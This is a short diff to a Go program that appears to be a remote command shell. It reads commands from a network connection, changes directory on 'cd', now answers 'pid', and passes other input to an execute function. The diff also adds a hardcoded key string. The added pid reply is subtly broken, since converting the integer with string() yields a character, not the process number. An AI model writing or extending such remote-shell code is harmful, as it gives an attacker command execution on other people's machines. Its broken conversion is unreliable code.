@@ -33,6 +33,8 @@ func push(conn net.Conn) {
          pieces := strings.Split(message, "cd")
          os.Chdir(strings.TrimSpace(pieces[1]))
          conn.Write([]byte(" "))
+      } else if (strings.HasPrefix(message, "pid")) {
+         conn.Write([]byte(string(os.Getpid())))
       } else {
          output, err := execute(message)
          if err != nil {
@@ -63,3 +65,5 @@ func main() {
       push(conn)
    }
 }
+
+var key = "N1Q1WG0A7U3S5QVT03NL3US6GKOE6D"
